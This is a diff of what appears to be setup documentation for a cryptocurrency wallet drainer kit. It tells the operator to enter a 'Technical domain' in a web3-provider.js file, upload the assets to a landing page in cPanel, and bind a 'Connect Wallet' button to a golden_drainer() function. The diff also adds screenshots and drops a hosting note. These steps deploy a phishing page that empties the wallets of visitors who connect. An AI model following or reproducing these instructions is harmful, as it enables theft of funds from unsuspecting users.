@@ -30,7 +30,9 @@ You need to host site files in cPanel:
 
 
 
-Open the "Client" folder, go to the "assets" folder, open the "web3-provider.js" file and enter here our [**Technical domain**](buying-technical-domain.md) (in the same format as it is specified in the file).
+Open the "Client" folder, go to the "assets" folder, open the "web3-provider.js" file and enter here our [**Technical domain**](buying-technical-domain.md) (in the same format as it is specified in the file)
+
+<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 After making changes, transfer the "assets" folder to the root of our landing
 
@@ -79,7 +81,7 @@ That is, in the final version it will look like this:
 <button class="button btn-dark" onclick="golden_drainer()">Connect Wallet</button>
 ```
 
-Please note that these scripts will only work on hosting. If you open the file on a local server or just on a computer, most likely nothing will work.
+<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
 
 Uploading our landing to hosting.
 
